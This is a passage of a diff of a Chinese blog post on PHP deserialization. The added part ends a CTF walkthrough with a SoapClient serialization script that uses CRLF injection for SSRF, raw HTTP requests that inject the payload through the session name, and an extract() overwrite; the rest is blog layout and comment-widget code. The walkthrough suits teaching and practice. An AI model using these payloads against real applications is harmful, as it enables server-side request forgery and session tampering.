+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;flag=demo&#x27;</span>;</span><br><span class="line"><span class="variable">$ua</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=test&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$ua</span>) . <span class="string">&quot;\r\nContent-Length: &quot;</span> . (<span class="keyword">string</span>) <span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>). <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$post_data</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_string</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="variable">$options</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$serialize_string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>传参打，当然这里需要在 name 前面加一个 <code>|</code> 符号，这样一来当程序加载用户的 session 值时，就会使用 php 处理器进行处理，将 <code>|</code> 符号前面作为键名，后面的内容作为键值，此时便成功反序列化 Session 后面的内容</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A9%3A%22drunkbaby%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A32%3A%22drunkbaby%0D%0ACookie%3APHPSESSID%3Devil%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>644ac9ed-fd72-4092-913c-3e5c0834c6c8.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=test</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">serialize_handler</span>=php_serialize</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/step1.png" class>
+
+<p>第二步，通过 extract 变量覆盖</p>
+<p>传参如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?f=extract</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>644ac9ed-fd72-4092-913c-3e5c0834c6c8.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=test</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">b</span><span class="operator">=</span>call_user_func</span></span><br></pre></td></tr></table></figure>
+
+<p>完成构造 <code>call_user_func(&#39;call_user_func&#39;,array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;);</code></p>
+<p>最后一步发起请求，由于 session 会被保存到对应 SoapClient 的 session，所以需要请求对应的 session</p>
+<img src="/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/solve3.png" class>
+
+<p>solved！</p>
+
             </div>
 
             
@@ -572,135 +716,77 @@
             <i class="fas fa-comments"></i>&nbsp;评论
         </div>
         
-            .valine-container {
+            
 
-  #vcomments {
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
 
-    .vwrap {
-
-      border 0.1rem solid var(--text-color-4)
-
-      .vheader {
-
-        .vinput {
-
-          color var(--text-color-3)
-          border-color var(--text-color-4)
-
-          &:focus {
-            border-bottom 0.1rem dashed var(--primary-color) !important
-          }
-        }
-      }
-
-
-      .vedit {
-
-        .veditor {
-          color var(--text-color-3)
-        }
-
-        .vctrl {
-
-          .vicon {
-
-            fill var(--text-color-3)
-
-            &.actived {
-              fill var(--primary-color)
+            const config = {
+              el: '#vcomments',
+              appId: '9Ky0YY6Ij33nFC4KZ2VcGh9k-MdYXbMMI',
+              appKey: 'qqN77H4k2Hxhg7ZJ88Lf0xxM',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
             }
+
+            if ('https://9Ky0YY6I.api.lncldglobal.com') {
+              config.serverURLs = 'https://9Ky0YY6I.api.lncldglobal.com'
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                case 'zh-TW':
+                  return '站長'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
           }
-        }
-      }
 
-
-      button.vsubmit {
-        color var(--text-color-3) !important
-        background transparent !important
-        border 0.1rem solid var(--text-color-3) !important
-
-        &:hover {
-          color var(--primary-color) !important
-          border 0.1rem solid var(--primary-color) !important
-        }
-      }
-    }
-
-
-    .vcount {
-      color var(--text-color-3)
-
-      .vnum {
-        color var(--text-color-2)
-      }
-    }
-
-
-    .vcard {
-
-      .vnick {
-        .author {
-          margin-left 0.15rem
-          padding 0.15rem
-          color #fff
-          font-weight 450
-          font-size 0.9rem
-          background -webkit-linear-gradient(45deg, #e3565e, #ee854b, #f6c258, #90c68a, #5fb3b3, #6699cc, #c594c5)
-          background linear-gradient(45deg, #e3565e, #ee854b, #f6c258, #90c68a, #5fb3b3, #6699cc, #c594c5)
-          border-radius 0.15rem
-        }
-      }
-
-
-      .vhead {
-
-        .vnick {
-          color var(--primary-color)
-        }
-
-        .vsys {
-          color var(--text-color-3)
-          background var(--background-color-2) !important
-        }
-      }
-
-
-      .vcontent {
-        P {
-          color var(--text-color-3)
-
-          code {
-            color var(--code-foreground)
-            background var(--code-background)
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
           }
-        }
-      }
+        </script>
+    </div>
 
-
-      .vh {
-        border-bottom-color var(--border-color)
-      }
-
-      .vquote {
-        border-left-color var(--border-color)
-      }
-    }
-
-
-    .vcopy {
-      color var(--text-color-4)
-    }
-
-
-    .vpage {
-
-      .vmore {
-        color var(--text-color-2)
-        border 0.1rem solid var(--border-color)
-      }
-    }
-  }
-}
 
         
     </div>
@@ -716,7 +802,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PHP-%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x02 PHP 的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-demo"><span class="nav-text">简单的 demo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-PHP-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">0x03 PHP 魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#construct-%E4%B8%8E-destruct"><span class="nav-text">__construct() 与 __destruct()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep"><span class="nav-text">__sleep()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup"><span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString-NaN"><span class="nav-text">__toString()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke"><span class="nav-text">__invoke()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get"><span class="nav-text">__get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set"><span class="nav-text">__set</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-text">__call()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset"><span class="nav-text">__isset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unset"><span class="nav-text">__unset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB%E4%BE%8B%E5%AD%90"><span class="nav-text">常用魔术函数汇总例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CTF-%E9%A2%98%E7%9B%AE"><span class="nav-text">简单的 PHP 反序列化 CTF 题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-text">0x04 反序列化之字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="nav-text">过滤后字符变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bugku-Web-new-php"><span class="nav-text">bugku Web new php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2016-piapiapia-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%90%8E%E5%8F%98%E5%A4%9A"><span class="nav-text">0CTF 2016 piapiapia 1 字符串逃逸后变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="nav-text">过滤后字符变少</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x05 Session 反序列化</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PHP-%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x02 PHP 的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-demo"><span class="nav-text">简单的 demo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-PHP-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">0x03 PHP 魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#construct-%E4%B8%8E-destruct"><span class="nav-text">__construct() 与 __destruct()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep"><span class="nav-text">__sleep()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup"><span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString-NaN"><span class="nav-text">__toString()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke"><span class="nav-text">__invoke()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get"><span class="nav-text">__get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set"><span class="nav-text">__set</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-text">__call()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset"><span class="nav-text">__isset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unset"><span class="nav-text">__unset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB%E4%BE%8B%E5%AD%90"><span class="nav-text">常用魔术函数汇总例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CTF-%E9%A2%98%E7%9B%AE"><span class="nav-text">简单的 PHP 反序列化 CTF 题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-text">0x04 反序列化之字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="nav-text">过滤后字符变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bugku-Web-new-php"><span class="nav-text">bugku Web new php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2016-piapiapia-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%90%8E%E5%8F%98%E5%A4%9A"><span class="nav-text">0CTF 2016 piapiapia 1 字符串逃逸后变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="nav-text">过滤后字符变少</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x05 Session 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-PHP-Session"><span class="nav-text">什么是 PHP Session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Session-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-text">PHP Session 的工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Session-%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="nav-text">PHP Session 的存储机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-text">PHP 处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-binary-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-text">php_binary 处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-text">php_serialize 处理器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B"><span class="nav-text">漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%80"><span class="nav-text">例题一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E4%BA%8C"><span class="nav-text">例题二</span></a></li></ol></li></ol></li></ol>
     </div>
 </div>
 
@@ -897,7 +983,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PHP-%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x02 PHP 的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-demo"><span class="nav-text">简单的 demo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-PHP-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">0x03 PHP 魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#construct-%E4%B8%8E-destruct"><span class="nav-text">__construct() 与 __destruct()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep"><span class="nav-text">__sleep()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup"><span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString-NaN"><span class="nav-text">__toString()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke"><span class="nav-text">__invoke()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get"><span class="nav-text">__get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set"><span class="nav-text">__set</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-text">__call()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset"><span class="nav-text">__isset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unset"><span class="nav-text">__unset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB%E4%BE%8B%E5%AD%90"><span class="nav-text">常用魔术函数汇总例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CTF-%E9%A2%98%E7%9B%AE"><span class="nav-text">简单的 PHP 反序列化 CTF 题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-text">0x04 反序列化之字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="nav-text">过滤后字符变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bugku-Web-new-php"><span class="nav-text">bugku Web new php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2016-piapiapia-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%90%8E%E5%8F%98%E5%A4%9A"><span class="nav-text">0CTF 2016 piapiapia 1 字符串逃逸后变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="nav-text">过滤后字符变少</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x05 Session 反序列化</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PHP-%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x02 PHP 的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-demo"><span class="nav-text">简单的 demo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-PHP-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">0x03 PHP 魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#construct-%E4%B8%8E-destruct"><span class="nav-text">__construct() 与 __destruct()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep"><span class="nav-text">__sleep()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup"><span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString-NaN"><span class="nav-text">__toString()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke"><span class="nav-text">__invoke()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get"><span class="nav-text">__get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set"><span class="nav-text">__set</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-text">__call()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset"><span class="nav-text">__isset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unset"><span class="nav-text">__unset()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB%E4%BE%8B%E5%AD%90"><span class="nav-text">常用魔术函数汇总例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CTF-%E9%A2%98%E7%9B%AE"><span class="nav-text">简单的 PHP 反序列化 CTF 题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-text">0x04 反序列化之字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="nav-text">过滤后字符变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bugku-Web-new-php"><span class="nav-text">bugku Web new php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2016-piapiapia-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%90%8E%E5%8F%98%E5%A4%9A"><span class="nav-text">0CTF 2016 piapiapia 1 字符串逃逸后变多</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="nav-text">过滤后字符变少</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x05 Session 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-PHP-Session"><span class="nav-text">什么是 PHP Session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Session-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-text">PHP Session 的工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Session-%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="nav-text">PHP Session 的存储机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-text">PHP 处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-binary-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-text">php_binary 处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-text">php_serialize 处理器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B"><span class="nav-text">漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%80"><span class="nav-text">例题一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E4%BA%8C"><span class="nav-text">例题二</span></a></li></ol></li></ol></li></ol>
     </div>
 </div>
 
